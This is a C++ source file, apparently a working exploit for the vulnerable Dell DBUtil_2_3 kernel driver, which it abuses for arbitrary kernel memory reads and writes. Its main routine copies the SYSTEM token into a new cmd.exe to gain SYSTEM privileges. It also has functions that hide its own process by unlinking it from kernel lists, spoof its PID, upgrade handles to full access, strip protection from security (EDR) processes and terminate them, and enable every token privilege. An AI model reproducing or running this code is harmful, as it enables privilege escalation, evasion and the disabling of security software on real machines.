// HideMyAss.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//

#include <iostream>
#include <windows.h>
#include <Psapi.h>
#include "typedefs.h"
#pragma comment(lib, "ntdll.lib")
HANDLE Device;
CLIENT_ID ourProc;
DWORD64 systemEprocessAddr;
DWORD64 ourHandleTable;

static const DWORD DBUTIL_READ_IOCTL = 0x9B0C1EC4;
static const DWORD DBUTIL_WRITE_IOCTL = 0x9B0C1EC8;

DWORD64 GetKernelBaseAddress() {
	DWORD cb = 0;
	LPVOID drivers[1024];

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
		return (DWORD64)drivers[0];
	}
	return NULL;
}

DWORD ReadPrimitive(DWORD64 Address) {
	DBUTIL_READ_BUFFER ReadBuff{};
	ReadBuff.Address = Address;
	DWORD BytesRead;
	DeviceIoControl(Device,
		DBUTIL_READ_IOCTL,
		&ReadBuff,
		sizeof(ReadBuff),
		&ReadBuff,
		sizeof(ReadBuff),
		&BytesRead,
		nullptr);
	return ReadBuff.value;
}

void WritePrimitive(DWORD64 Address, long long Value) {
	DBUTIL_WRITE_BUFFER WriteBuff{};
	WriteBuff.Address = Address;
	WriteBuff.Value = Value;

	DWORD BytesWritten = 0;

	DeviceIoControl(Device,
		DBUTIL_WRITE_IOCTL,
		&WriteBuff,
		sizeof(WriteBuff),
		&WriteBuff,
		sizeof(WriteBuff),
		&BytesWritten,
		nullptr);
}
BYTE ReadBYTE(DWORD64 Address) {
	return ReadPrimitive(Address) & 0xffffff;
}


WORD ReadWORD(DWORD64 Address) {
	return ReadPrimitive(Address) & 0xffff;
}

DWORD ReadDWORD(DWORD64 Address) {
	return ReadPrimitive(Address);
}

DWORD64 ReadDWORD64(DWORD64 Address) {
	return (static_cast<DWORD64>(ReadDWORD(Address + 4)) << 32) | ReadDWORD(Address);
}

void WriteDWORD64(DWORD64 Address, long long Value) {
	WritePrimitive(Address, Value);
}

ULONG64 kernelBase;
DWORD64 PsInitialSystemProcess()
{
	DWORD64 res = 0;
	ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	if (kernelBase) {
		res = ReadDWORD64(addr - ntos + kernelBase);
	}
	return res;
}


class NtoskrnlOffsetsBuild
{

public:
	DWORD64 ActiveProcessLinks;
	DWORD64 UniqueProcessId;
	DWORD64 ThreadListHead;
	DWORD64 Protection;
	DWORD64 Token;
	DWORD64 ObjectTable;
	DWORD64 TrapFrame;
	DWORD64 Rip;
	DWORD64 ThreadListEntry;
	DWORD64 Cid;
	DWORD64 EtwThreatIntProvRegHandle;
	DWORD64 GuidEntry;
	DWORD64 EnableInfo;
	DWORD64 Guid;
};

NtoskrnlOffsetsBuild Offsets = { 0x448,0x440,0x5e0, 0x87a,0x4b8,0x570, 0x90, 0x168, 0x4e8, 0x478, 0xc19838, 0x20, 0x60, 0x28 };
 
//pid 4 as stop 
DWORD64 LookupEprocessByPid(DWORD64 papaProc, CLIENT_ID procid) {
	DWORD64 ActiveProcLinkPointer = papaProc + Offsets.ActiveProcessLinks;
	DWORD64 nextFlinkAddr = ReadDWORD64(ActiveProcLinkPointer);
	DWORD64 nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
	DWORD64 targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
	while (targetPID != (DWORD64)procid.UniqueProcess) {
		nextFlinkAddr = ReadDWORD64(nextEproccess + Offsets.ActiveProcessLinks);
		nextEproccess = nextFlinkAddr - Offsets.ActiveProcessLinks;
		targetPID = ReadDWORD64(nextEproccess + Offsets.UniqueProcessId);
	}
	return nextEproccess;
}

void HideMyProcess(CLIENT_ID OurProc) {

	DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
	DWORD64 ourFlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks);
	DWORD64 ourBlink = ReadDWORD64(ourEproc + Offsets.ActiveProcessLinks + 0x8);
	WriteDWORD64(ourBlink, ourFlink);
	WriteDWORD64(ourFlink + 8, ourBlink);
	WriteDWORD64(ourEproc + Offsets.ActiveProcessLinks, 0);
	WriteDWORD64(ourEproc + Offsets.ThreadListEntry + 0x8, 0);
	std::cout << "[#]Cant see me (-john cena)" << std::endl;
}

void ChangeMyPid(CLIENT_ID OurProc, int NewPid) {
	DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
	std::cout << "[#]Found our EPROCESS @: " << ourEproc << std::endl;
	WriteDWORD64(ourEproc + Offsets.UniqueProcessId, NewPid);
	std::cout << "[#]Changed PID to: " << NewPid << std::endl;
}

DWORD64 RetriveTokenAdress(CLIENT_ID procid) {
	return  LookupEprocessByPid(systemEprocessAddr, procid) + Offsets.Token;
}


VOID WriteBySize(SIZE_T Size, DWORD64 Address, PVOID Buffer) {
	struct DBUTIL23_MEMORY_WRITE* WriteBuff = (DBUTIL23_MEMORY_WRITE*)calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
	if (!WriteBuff) {
		exit(1);
	}
	WriteBuff->Address = Address;
	WriteBuff->Offset = 0;
	DWORD BytesReturned;

	if (Address < 0x0000800000000000) {
		exit(1);
	}
	if (Address < 0xFFFF800000000000) {
		exit(1);
	}

	memcpy(WriteBuff->Buffer, Buffer, Size);
	DeviceIoControl(Device,
		DBUTIL_WRITE_IOCTL,
		WriteBuff,
		offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
		WriteBuff,
		offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
		&BytesReturned,
		NULL);
}

DWORD64 ExpLookupHandleTableEntry(DWORD64 HandleTable, ULONGLONG Handle)
{
	ULONGLONG v2;
	LONGLONG v3;
	ULONGLONG result;
	ULONGLONG v5;

	ULONGLONG a1 = (ULONGLONG)HandleTable;

	v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= ReadDWORD(a1)) {
		result = 0i64;
	}
	else {
		v3 = ReadDWORD64(a1 + 8);
		if (ReadDWORD64(a1 + 8) & 3) {
			if ((ReadDWORD(a1 + 8) & 3) == 1) {
				v5 = ReadDWORD64(v3 + 8 * (v2 >> 10) - 1);
				result = v5 + 4 * (v2 & 0x3FF);
			}
			else {
				v5 = ReadDWORD(ReadDWORD(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
				result = v5 + 4 * (v2 & 0x3FF);
			}
		}
		else {
			result = v3 + 4 * v2;
		}
	}
	return (DWORD64)result;
}

void TransferToken(CLIENT_ID Src, CLIENT_ID Dst) {

	DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);
	DWORD64 SourceTokenAddress = RetriveTokenAdress(Src);
	EX_FAST_REF DstTokenObj;
	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);
	std::cout << "[#]Got:" << std::hex << DstTokenObj.Object << " for Process:" << (int)(DWORD)Dst.UniqueProcess << std::endl;

	EX_FAST_REF systemtoken;
	for (int i = 0; i < 8; i++) ((PCHAR)&systemtoken)[i] = ReadBYTE(SourceTokenAddress + i);
	std::cout << "[#]Got:" << std::hex << systemtoken.Object << " for Process:" << (int)(DWORD)Src.UniqueProcess << std::endl;
	std::cout << "[#]Elevating token from from:" << std::hex << DstTokenObj.Value << " To:" << std::hex << systemtoken.Value << std::endl;
	DstTokenObj.Value = systemtoken.Value;
	WriteBySize(8, DestinationTokenAddress, &DstTokenObj);
	std::cout << "[#]Finished -> who are you now?" << std::endl;
}


void ElevateHandle(DWORD64 hTableAddr, ULONGLONG hValue) {
	DWORD64 HandleTableEntry = ExpLookupHandleTableEntry(hTableAddr, hValue);
	BYTE forentry[16];
	for (int i = 0; i < 16; i++) forentry[i] = ReadBYTE(HandleTableEntry + i);
	HANDLE_TABLE_ENTRY* HandleTableEntryObject = (HANDLE_TABLE_ENTRY*)(void*)forentry;

	std::cout << "[#]Got HANDLE at address of: " << std::hex << HandleTableEntry << " with GrantedAccess bits of: " << std::hex << HandleTableEntryObject->GrantedAccess << std::endl;
	HandleTableEntryObject->GrantedAccess = 0x1fffff;

	WriteBySize(16, HandleTableEntry, HandleTableEntryObject);
	std::cout << "[#]Elevated HANDLE to GrantedAccess bits of: " << std::hex << 0x1fffff << " (FULL_CONTROL)" << std::endl;

}

void EnableDisableProtection(CLIENT_ID targetProcess, BOOL Enable) {
	DWORD64 EdrEproc = LookupEprocessByPid(systemEprocessAddr, targetProcess);
	std::cout << "[#]Found Target EPROCESS to " << (Enable ? "ENABLE" : "DISABLE") << std::endl;
	BYTE protect[1];
	protect[0] = ReadBYTE(EdrEproc + Offsets.Protection);
	PS_PROTECTION* procObj = (PS_PROTECTION*)(void*)protect;
	std::cout << "[#]Editing PS_PROTECTION to: " << (Enable ? 1 : 0) << std::endl << "[#]Editing Signer to: " << (Enable ? 3 : 0) << std::endl;
	procObj->Type = Enable ? 1 : 0;
	procObj->Signer = Enable ? 3 : 0;
	BYTE newProtect[1];
	std::memcpy(newProtect, procObj, 1);
	DWORD newProcData = newProtect[0];
	WriteBySize(sizeof(BYTE), EdrEproc + Offsets.Protection, &newProcData);
	std::cout << "[#]" << (Enable ? "ENABLED" : "DISABLED") << std::endl;
}

//turn off critical 
void TerminateProtectedProcess(int pid) {
	NTSTATUS r;
	CLIENT_ID id;
	std::cout << "[#]Got PID: " << pid << " to Terminate" << std::endl;

	id.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
	id.UniqueThread = (PVOID)0;
	OBJECT_ATTRIBUTES oa;
	HANDLE handle = 0;
	InitObjAttr(&oa, NULL, NULL, NULL, NULL);
	std::cout << "[#]Openeing PROCESS_QUERY_LIMITED_INFORMATION handle to: " << pid << std::endl;
	NTSTATUS Op = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
	std::cout << "[#]NtOpenProcess Status: " << std::hex << Op << std::endl;
	if (handle == INVALID_HANDLE_VALUE) {
		std::cout << "[#]Unable to obtain a handle to process " << std::endl;
		ExitProcess(0);
	}
	ElevateHandle(ourHandleTable, (ULONGLONG)handle);
	EnableDisableProtection(id, FALSE);
	std::cout << "[#]Terminating: " << pid << std::endl;
	TerminateProcess(handle, 0);
	std::cout << "[#]ILL BE BACK (-terminator)" << std::endl;

}



DWORD64 RetriveEprocessHandleTable(CLIENT_ID procid) {
	DWORD64 targetProc = LookupEprocessByPid(systemEprocessAddr, procid);
	return ReadDWORD64(targetProc + Offsets.ObjectTable);
}


SEP_TOKEN_PRIVILEGES RetriveTokenPrivFromPID(int PID)
{
	auto Dst = CLIENT_ID{ (HANDLE)PID, nullptr };
	DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);

	EX_FAST_REF DstTokenObj;
	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);

	_TOKEN tokenObject;
	for (int i = 0; i < sizeof(tokenObject); i++) ((PCHAR)&tokenObject)[i] = ReadBYTE((size_t(DstTokenObj.Object) & 0xfffffffffffffff0) + i);
	return tokenObject.Privileges;
}

void EnableAllPriv(int PID) {
	//https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#2.-modifying-token-privileges
	DWORD64 DestinationTokenAddress = RetriveTokenAdress(CLIENT_ID{ (HANDLE)PID, nullptr });

	EX_FAST_REF DstTokenObj;
	for (int i = 0; i < 8; i++) ((PCHAR)&DstTokenObj)[i] = ReadBYTE(DestinationTokenAddress + i);

	_TOKEN tokenObject;
	for (int i = 0; i < sizeof(tokenObject); i++) ((PCHAR)&tokenObject)[i] = ReadBYTE((size_t(DstTokenObj.Object) & 0xfffffffffffffff0) + i);

	tokenObject.Privileges.Enabled = 0x0000001ff2ffffbc;
	tokenObject.Privileges.Present = 0x0000001ff2ffffbc;
	WriteBySize(sizeof(tokenObject), (size_t)DstTokenObj.Object & 0xfffffffffffffff0, &tokenObject);
}

int main() {

	systemEprocessAddr = PsInitialSystemProcess();
	Device = CreateFileW(L"\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (Device == INVALID_HANDLE_VALUE) {
		std::cout << "Unable to obtain a handle to the device object: " << GetLastError() << std::endl;
		ExitProcess(0);
	}
	kernelBase = GetKernelBaseAddress();
	systemEprocessAddr = PsInitialSystemProcess();
	printf("kernelBase : %llx\n", kernelBase);
	printf("systemEprocessAddr : %llx\n", systemEprocessAddr);
	printf("current PID : %x\n", GetCurrentProcessId());

	CLIENT_ID ourProc = { (HANDLE)GetCurrentProcessId(), nullptr };
	ourHandleTable = RetriveEprocessHandleTable(ourProc);

	//TerminateProtectedProcess(5908);
	//Sleep(-1);
	//HideMyProcess( CLIENT_ID { (HANDLE)GetCurrentProcessId(), nullptr});


	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	std::cout << "[#]Creating new CMD" << std::endl;
	BOOL created = CreateProcess(L"C:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	//ChangeMyPid(CLIENT_ID{ (HANDLE)GetCurrentProcessId(), nullptr }, 0);

	TransferToken(CLIENT_ID{ (HANDLE)4, nullptr }, CLIENT_ID{ (HANDLE)pi.dwProcessId, nullptr });
	//EnableAllPriv(pi.dwProcessId);
	std::cout << "[#]Finished -> who are you now?" << std::endl;

	Sleep(-1);
}
